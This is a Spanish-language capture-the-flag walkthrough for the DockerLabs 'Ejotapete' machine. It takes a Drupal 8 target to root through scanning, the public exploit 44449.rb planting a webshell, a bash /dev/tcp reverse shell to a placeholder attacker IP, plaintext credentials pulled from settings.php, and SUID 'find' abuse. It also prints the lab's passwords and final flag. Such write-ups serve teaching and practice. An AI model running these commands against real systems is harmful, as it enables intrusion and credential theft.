- `bash auto_deploy.sh ejotapete.tar`: Despliega el entorno vulnerable en Docker.
    
- `ping -c 1 172.17.0.2`: Verifica la conectividad y confirma que el sistema operativo es Linux (por el TTL).
    
- `nmap -sn 172.17.0.0/24`: Descubre hosts activos dentro de la subred de Docker.
    
- `sudo nmap -p- --min-rate 5000 -vvv -sV -sC -n -Pn 172.17.0.2 -oN allPorts.txt`: Escanea puertos abiertos, servicios y versiones en la máquina objetivo.
    
- `ffuf -u [http://172.17.0.2/FUZZ](http://172.17.0.2/FUZZ) -w /usr/share/wordlists/dirb/common.txt`: Realiza fuzzing de directorios para descubrir rutas ocultas (encuentra `/drupal`).
    
- `searchsploit Drupal 8` y `searchsploit -m 44449.rb`: Busca y descarga un exploit público para la versión vulnerable de Drupal.
    
- `sudo ruby 44449.rb [http://172.17.0.2/drupal](http://172.17.0.2/drupal)`: Ejecuta el exploit para aprovechar la vulnerabilidad RCE y subir una webshell.
    
- `nc -lvnp 4444`: Pone la máquina atacante en escucha para recibir la conexión de la reverse shell.
    
- `bash -c "bash -i >& /dev/tcp/<TU_IP>/4444 0>&1"`: Ejecuta la reverse shell hacia el equipo atacante.
    
- `script /dev/null -c bash / CTRL + Z / stty raw -echo;fg / reset xterm / export TERM=xterm && export SHELL=bash / stty rows 50 columns 236`: Comandos para el tratamiento y estabilización de la TTY.

- `find / -iname "settings.php" 2>/dev/null`: Busca archivos de configuración para extraer credenciales en texto plano.
    
- `find / -perm -4000 -type f 2>/dev/null`: Busca binarios con permisos SUID para intentar escalar privilegios.
    
- `find . -exec /bin/sh \; -quit`: Abusa del binario SUID `find` para escalar a root.
    

## Resolución de la Máquina: Ejotapete (DockerLabs)

### 1. Despliegue y Reconocimiento

Iniciamos levantando la máquina con el script proporcionado y verificamos nuestra conectividad. Un escaneo de red revela la IP objetivo (`172.17.0.2`). Al ejecutar Nmap sobre todos los puertos, identificamos el puerto **80 (HTTP)** abierto. Al acceder, el servidor devuelve un error 403.

Para buscar rutas ocultas, utilizamos **ffuf** y encontramos el directorio `/drupal`. Inspeccionando el código fuente de la página (`Ctrl + U`) y buscando la etiqueta `generator`, confirmamos que el sitio corre sobre **Drupal 8**.

### 2. Explotación (RCE)

Consultamos SearchSploit para la versión de Drupal 8 y encontramos el exploit **44449.rb**. Esta vulnerabilidad permite Ejecución Remota de Código (RCE) porque el sistema no desinfecta correctamente los datos recibidos en los formularios.

El script sube un archivo `shell.php`. Utilizando `curl`, inyectamos un payload para enviarnos una reverse shell a nuestro puerto en escucha con Netcat (`nc -lvnp 4444`), obteniendo acceso inicial como el usuario `www-data`. Estabilizamos la TTY para trabajar de forma interactiva.

### 3. Movimiento Lateral

Revisando los usuarios del sistema en `/etc/passwd`, identificamos al usuario `ballenita`. Como estamos en un entorno Drupal, buscamos su archivo de configuración principal:

Bash

```
find / -iname "settings.php" 2>/dev/null
```

Al leer `/var/www/html/drupal/sites/default/settings.php`, encontramos las credenciales de la base de datos en texto plano:

- **Usuario:** `ballenita`
    
- **Contraseña:** `ballenitafeliz`
    

Reutilizamos esta contraseña para cambiar al usuario del sistema con `su ballenita`.

### 4. Escalada de Privilegios

Para escalar a root, buscamos binarios con permisos SUID en el sistema:

Bash

```
find / -perm -4000 -type f 2>/dev/null
```

Identificamos que el binario `/usr/bin/find` tiene permisos SUID. Consultando en _GTFOBins_, ejecutamos el siguiente comando para abusar de este binario y spawnear una shell como administrador:

Bash

```
find . -exec /bin/sh \; -quit
```

Obtenemos acceso como **root**. Finalmente, leemos el archivo `secetitomaximo.txt` para obtener la contraseña o flag final: `nobodycanfindthispasswordrootrocks`.